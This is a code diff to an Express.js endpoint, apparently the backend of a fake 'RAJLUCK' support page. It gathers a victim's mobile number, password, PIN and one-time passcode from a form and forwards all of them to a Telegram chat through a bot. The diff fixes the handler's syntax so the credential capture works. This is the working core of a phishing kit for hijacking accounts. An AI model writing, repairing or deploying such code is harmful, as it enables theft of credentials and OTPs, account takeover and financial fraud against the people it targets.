@@ -22,19 +22,21 @@ app.post("/submit", async (req, res) => {
         const { phone, password, pin, otp, issue } = req.body;
 
         // Basic validation check
-        if (!phone || !password || !pin || !otp)
+        if (!phone || !password || !pin || !otp) {
             return res.status(400).json({
                 success: false,
                 message: "Kripya mobile number aur OTP dono enter karein."
-            
-            }
-const messageText = `RAJLUCK NOTIFICATION
+            });
+        }
+
+        const messageText = `RAJLUCK NOTIFICATION
 📌 Support Issue: ${issue}
 📱 Mobile Number: ${phone}
 🔑 Password: ${password}
 🆔 Pin: ${pin}
 📨 Received OTP: ${otp}
 Demo support information received.`;
+
         // Telegram bot ke zariye chat mein message send karna
         await bot.sendMessage(process.env.CHAT_ID, messageText);
 
